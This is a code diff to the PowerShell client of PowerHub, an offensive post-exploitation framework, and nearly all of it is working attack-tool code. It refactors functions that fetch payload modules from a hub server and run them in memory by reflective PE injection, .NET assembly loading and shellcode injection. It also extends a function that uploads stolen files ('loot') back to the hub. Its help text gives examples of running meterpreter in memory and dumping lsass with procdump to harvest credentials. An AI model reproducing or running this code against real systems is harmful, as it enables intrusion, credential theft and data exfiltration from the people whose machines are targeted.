@@ -47,11 +47,9 @@ function Import-HubModule {
         $Module
     )
 
-    if ($Module.Type -eq "ps1") {
-        $code = $Module.Code
-        $sb = [Scriptblock]::Create($code)
-        New-Module -ScriptBlock $sb | Out-Null
-    }
+    $code = $Module.Code
+    $sb = [Scriptblock]::Create($code)
+    New-Module -ScriptBlock $sb | Out-Null
 
     if ($?){
         Write-Verbose ("[*] {0} imported." -f $Module.Name)
@@ -88,8 +86,40 @@ Lists all modules that are available via the hub.
     $Modules | Format-Table -AutoSize -Property N,Type,Name,Loaded
 }
 
-function Load-HubModule {
+function Get-HubModule {
+<#
+.SYNOPSIS
 
+Simply returns a hub module for further processing. Its only parameter  works
+similar to Load-HubModule. In fact, Load-HubModule calls Get-HubModule.
+
+.PARAMETER Expression
+
+See help of Load-HubModule.
+
+#>
+    Param(
+        [parameter(Mandatory=$true)]
+        [String]
+        $Expression
+    )
+
+    if ($Expression -match "^[0-9-,]+$") {
+        $indices = Convert-IntStringToArray($Expression)
+    } else {
+        $indices = $Modules | Where { $_.Name -match $Expression } | % {$_.N}
+    }
+
+    $result = @()
+    foreach ($i in $indices) {
+        if ($i -lt $Modules.length -and $i -ge 0) {
+            $result += $Modules[$i]
+        }
+    }
+    return $result
+}
+
+function Load-HubModule {
 <#
 .SYNOPSIS
 
@@ -156,24 +186,18 @@ Use the '-Verbose' option to print detailed information.
         $Expression
     )
 
-    Update-HubModules
-
-    if ($Expression -match "^[0-9-,]+$") {
-        $indices = Convert-IntStringToArray($Expression)
-    } else {
-        $indices = $Modules | Where { $_.Name -match $Expression } | % {$_.N}
-    }
-
     $result = @()
-    foreach ($i in $indices) {
-        if ($i -lt $Modules.length -and $i -ge 0) {
-            $args = @{"m"="$i"}
-            # if ($PS_VERSION -eq 2) { $args["c"] = "1" }
-            $Modules[$i].Code = Transport-String "m" $args
-            $Modules[$i].Loaded = $True
-            Import-HubModule $Modules[$i]
+    Get-HubModule $Expression | % {
+        $args = @{"m"=$_.N}
+        # if ($PS_VERSION -eq 2) { $args["c"] = "1" }
+        if ($_.Type -eq 'ps1') {
+            $_.Code = Transport-String "m" $args
+            Import-HubModule $_
+        } else {
+            $_.Code = Transport-String "m" $args $True
         }
-        $result += $Modules[$i]
+        $_.Loaded = $True
+        $result += $_
     }
     $result
 }
@@ -187,7 +211,7 @@ Executes a loaded exe module in memory using Invoke-ReflectivePEInjection, which
 
 .PARAMETER Module
 
-An integer reference the module to execute or the module object itself. Use List-HubModules to find this integer.
+A PowerHub module object of type 'exe'.
 
 .PARAMETER ExeArgs
 
@@ -201,12 +225,12 @@ WARNING: Endpoint protection WILL catch malware this way.
 
 .EXAMPLE
 
-Run-Exe 47
+Run-Exe $hubModule
 
 Description
 -----------
 
-Execute the exe module 47 in memory
+Execute some Hub Module of type 'exe' in memory.
 
 .EXAMPLE
 
@@ -215,17 +239,29 @@ Load-HubModule meterpreter.exe | Run-Exe
 Description
 -----------
 
-Load the exe module with the name 'meterpreter.exe' in memory and run it
+Load the exe module with the name 'meterpreter.exe' in memory and run it.
+
+.EXAMPLE
+
+Get-HubModule procdump64 | Run-Exe -ExeArgs "-accepteula -ma lsass.exe lsass.dmp"
+
+Description
+-----------
+
+Run the binary whose name matches 'procdump64' in memory and dump the lsass process.
 #>
     Param(
-        [parameter(Mandatory=$true,Position=0,ValueFromPipeline=$true)] $Module,
+        [parameter(Mandatory=$true,Position=0,ValueFromPipeline=$true)]
+        [PSTypeName("PowerHub.Module")] $Module,
+
         [parameter(Mandatory=$false,Position=1)] [String] $ExeArgs,
+
         [parameter(Mandatory=$false)] [Switch] $OnDisk
     )
 
     if ($OnDisk) {
-        foreach ($n in $Module) {
-            $Filename = Save-HubModule $n -Directory $env:TMP
+        foreach ($m in $Module) {
+            $Filename = Save-HubModule $m -Directory $env:TMP
             if ($ExeArgs) {
                 Start-Process -FilePath "$Filename" -ArgumentList "$ExeArgs"
             } else {
@@ -233,14 +269,12 @@ Load the exe module with the name 'meterpreter.exe' in memory and run it
             }
         }
     } else {
+        if (-not (Get-Command "Invoke-ReflectivePEInjection" -errorAction SilentlyContinue)) {
+            Load-HubModule Invoke-ReflectivePEInjection
+        }
         if (Get-Command "Invoke-ReflectivePEInjection" -errorAction SilentlyContinue) {
-            foreach ($n in $Module) {
-                if ($n.gettype() -eq [Int32]) {
-                    $code = $Modules[$n].Code
-                } else {
-                    $code = $n.Code
-                }
-                Invoke-ReflectivePEInjection -PEBytes $code -ForceASLR -ExeArgs $ExeArgs
+            foreach ($m in $Module) {
+                Invoke-ReflectivePEInjection -PEBytes $m.Code -ForceASLR -ExeArgs $ExeArgs
             }
         } else {
             Write-Error "[-] PowerSploit's Invoke-ReflectivePEInjection not available. You need to load it first."
@@ -254,13 +288,21 @@ function Save-HubModule {
 
 Saves a loaded module to disk. WARNING: This will most likely trigger endpoint protection!
 
+.PARAMETER Module
+
+A PowerHub module object.
+
+.PARAMETER Directory
+
+Directory in which to save the file.
+
 .EXAMPLE
 
-Save-HubModule 41 -Directory tmp/
+Get-HubModule SeatBelt | Save-HubModule -Directory tmp/
 
 Description
 -----------
-Save module 41 to directory tmp/
+Save that module whose name matches "SeatBelt" to directory tmp/
 
 .EXAMPLE
 
@@ -272,23 +314,24 @@ Description
 Load the exe module with the name 'meterpreter.exe' in memory and save it to disk
 #>
     Param(
-        [parameter(Mandatory=$true,Position=0,ValueFromPipeline=$true)] $Module,
+        [parameter(Mandatory=$true,Position=0,ValueFromPipeline=$true)]
+        [PSTypeName("PowerHub.Module")] $Module,
+
         [parameter(Mandatory=$false,Position=1)] $Directory = ""
     )
 
-    foreach ($n in $Module) {
-        if ($n.gettype() -eq [Int32]) {
-            $m = $Modules[$n]
-        } else {
-            $m = $n
-        }
+    foreach ($m in $Module) {
         $code = $m.Code
         if ($Directory) {
             $Filename = "$Directory/$($m.BaseName)"
         } else {
             $Filename = $m.BaseName
         }
-        $code | Set-Content "$Filename" -Encoding Byte
+        if ($m.Type -eq "ps1") {
+            $code | Set-Content "$Filename" -Encoding UTF8
+        } else {
+            $code | Set-Content "$Filename" -Encoding Byte
+        }
         $Filename
     }
 }
@@ -299,14 +342,20 @@ function Run-DotNETExe {
 
 Executes a .NET exe module in memory, which must be loaded first.
 
+This might trigger the anti-virus.
+
+.PARAMETER Module
+
+A PowerHub module object of type 'exe' (must be a .NET exe).
+
 .EXAMPLE
 
-Load-HubModule SeatBelt
-Run-DotNETExe 47 "system"
+Load-HubModule SeatBelt | Run-DotNETExe -Arguments "system"
 
 Description
 -----------
-Load and execute the .NET binary 47 in memory with the parameter "system"
+Load and execute the .NET binary whose name matches "SeatBelt" in memory with
+the parameter "system"
 
 .EXAMPLE
 
@@ -319,16 +368,13 @@ Load the .NET module with the name 'meterpreter.exe' in memory and run it
 #>
 
     Param(
-        [parameter(Mandatory=$true,Position=0,ValueFromPipeline=$true)] $Module,
+        [parameter(Mandatory=$true,Position=0,ValueFromPipeline=$true)]
+        [PSTypeName("PowerHub.Module")] $Module,
+
         [parameter(Mandatory=$false)] [String[]] $Arguments
     )
 
-    foreach ($n in $Module) {
-        if ($n.gettype() -eq [Int32]) {
-            $m = $Modules[$n]
-        } else {
-            $m = $n
-        }
+    foreach ($m in $Module) {
         $code = $m.Code
         $a = [Reflection.Assembly]::Load([byte[]]$code)
         $al = New-Object -TypeName System.Collections.ArrayList
@@ -344,13 +390,21 @@ function Run-Shellcode {
 
 Executes a loaded shellcode module in memory using Invoke-Shellcode, which must be loaded first.
 
+.PARAMETER Module
+
+A PowerHub module object of type "shellcode".
+
+.PARAMETER ProcessID
+
+A process ID of the process to be used for injection.
+
 .EXAMPLE
 
-Run-Shellcode 47
+Run-Shellcode $someModule
 
 Description
 -----------
-Execute the shellcode module 47 in memory
+Execute a HubModule of type "shellcode" in memory
 
 .EXAMPLE
 
@@ -362,18 +416,18 @@ Description
 Load the shellcode module with the name 'meterpreter.bin' in memory and run it
 #>
     Param(
-        [parameter(Mandatory=$true,Position=0,ValueFromPipeline=$true)] $Module,
+        [parameter(Mandatory=$true,Position=0,ValueFromPipeline=$true)]
+        [PSTypeName("PowerHub.Module")] $Module,
+
         [ValidateNotNullOrEmpty()] [UInt16] $ProcessID
     )
 
+    if (-not (Get-Command "Invoke-Shellcode" -errorAction SilentlyContinue)) {
+        Load-HubModule Invoke-Shellcode
+    }
     if (Get-Command "Invoke-Shellcode" -errorAction SilentlyContinue)
     {
-        foreach ($n in $Module) {
-            if ($n.gettype() -eq [Int32]) {
-                $m = $Modules[$n]
-            } else {
-                $m = $n
-            }
+        foreach ($m in $Module) {
             $code = $m.Code
             if ($ProcessID) {
                 Invoke-Shellcode -Shellcode $code -ProcessID $ProcessID
@@ -466,6 +520,15 @@ function PushTo-Hub {
 
 Uploads files back to the hub via Cmdlet.
 
+.PARAMETER Files
+
+An array of strings which contain the names of the files that you want to transfer.
+
+.PARAMETER Name
+
+Filename to be used, if the data is read from stdin. If empty, a combination of
+the hostname and a timestamp will be used.
+
 .EXAMPLE
 
 PushTo-Hub kerberoast.txt, users.txt
@@ -508,6 +571,9 @@ Get-ChildItem | PushTo-Hub -Name "directory-listing"
             } else {
                 $Body = $result | ConvertTo-Json
                 $Body = [system.Text.Encoding]::UTF8.GetBytes($Body)
+            }
+            if (-not $Name) {
+                $Name = "{0}_{1}.dat" -f $Env:COMPUTERNAME, (Get-Date -Format o)
             }
             Send-Bytes -LootId $LootId $Body $Name
         } else {
@@ -659,6 +725,7 @@ function Help-PowerHub {
 The following functions are available (some with short aliases):
   * List-HubModules (lshm)
   * Load-HubModule (lhm)
+  * Get-HubModule (ghm)
   * Update-HubModules (uhm)
   * Get-Loot (glo)
   * Run-Exe (re)
@@ -674,6 +741,7 @@ Use 'Get-Help' to learn more about those functions.
 
 try { New-Alias -Name pth -Value PushTo-Hub } catch { }
 try { New-Alias -Name lhm -Value Load-HubModule } catch { }
+try { New-Alias -Name ghm -Value Get-HubModule } catch { }
 try { New-Alias -Name lshm -Value List-HubModules } catch { }
 try { New-Alias -Name uhm -Value Update-HubModules } catch { }
 try { New-Alias -Name glo -Value Get-Loot } catch { }
